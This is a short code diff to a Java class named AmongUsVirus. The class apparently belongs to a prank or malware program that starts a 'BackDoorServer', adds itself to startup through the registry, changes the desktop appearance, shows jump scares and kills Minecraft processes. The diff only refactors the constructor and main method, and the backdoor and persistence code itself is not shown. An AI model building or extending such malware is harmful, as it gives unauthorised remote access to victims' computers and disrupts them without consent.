@@ -13,14 +13,10 @@ public class AmongUsVirus {
   private final BackDoorServer server;
   private final ServerStartup startup;
   private final AppearanceChanger changer;
-  private RandomJumpScare jumpScare;
+  private final RandomJumpScare jumpScare;
 
   public AmongUsVirus() {
-    try {
-      jumpScare = new RandomJumpScare();
-    } catch (final URISyntaxException e) {
-      e.printStackTrace();
-    }
+    jumpScare = new RandomJumpScare();
     server = new BackDoorServer();
     startup = new ServerStartup();
     startup.addRegistry();
@@ -28,8 +24,9 @@ public class AmongUsVirus {
     killMinecraftTasks();
   }
 
-  public static void main(final String[] args) throws URISyntaxException {
-    new RandomJumpScare();
+  public static void main(final String[] args) {
+    // new RandomJumpScare();
+    new AppearanceChanger();
   }
 
   public void killMinecraftTasks() {
